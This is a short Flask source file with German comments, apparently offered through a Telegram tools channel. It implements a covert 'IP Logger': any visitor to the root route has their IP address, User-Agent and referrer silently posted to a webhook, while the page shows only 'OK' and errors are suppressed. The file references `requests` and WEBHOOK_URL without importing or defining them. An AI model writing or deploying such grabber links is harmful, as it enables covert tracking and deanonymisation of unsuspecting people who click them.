from flask import Flask, request
import os

app = Flask(__name__)

@app.before_request
def block_internal():
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ip and ip.startswith(('127.', '10.', '172.16.', '192.168.', '34.82.')):  # Render-Bereich blocken
        if '/health' not in request.path:  # Falls du Health-Check hast
            return "OK", 200  # Silent für interne

@app.route('/')
def log_ip():
    try:
        # IP holen
        forwarded = request.headers.get('X-Forwarded-For')
        ip = forwarded.split(',')[0].strip() if forwarded else request.remote_addr
        
        # Render-interne IPs filtern
        if ip and ip.startswith(('127.', '10.', '172.16.', '192.168.', '34.82.')):
            return "OK", 200
        
        user_agent = request.headers.get('User-Agent', 'Unknown')
        referrer = request.headers.get('Referer', 'None')
        
        payload = {
            "content": f"🌐 **Neuer Besucher**\n**IP:** `{ip}`",
            "embeds": [{
                "title": "IP Logger",
                "description": f"IP: `{ip}`",
                "color": 16711680,
                "fields": [
                    {"name": "IP", "value": f"`{ip}`", "inline": False},
                    {"name": "User-Agent", "value": f"`{user_agent}`", "inline": False},
                    {"name": "Referrer", "value": f"`{referrer}`", "inline": False}
                ],
                "footer": {"text": "Ip logger t.me/kane_tools"}
            }]
        }
        
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
        
    except Exception:
        pass  # Alles abfangen
    
    return "OK", 200  # Immer zurückgeben!
